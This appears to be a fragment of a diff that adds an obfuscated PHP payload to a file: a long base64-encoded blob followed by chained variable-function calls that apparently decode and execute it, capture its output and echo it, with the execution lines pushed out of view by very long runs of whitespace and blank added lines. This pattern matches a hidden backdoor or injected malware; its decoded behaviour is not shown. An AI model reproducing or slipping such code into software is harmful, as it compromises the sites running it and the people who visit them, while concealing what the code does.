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';
+
+        $___();$__________($______($__($_))); $________=$____();
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                                     $________;
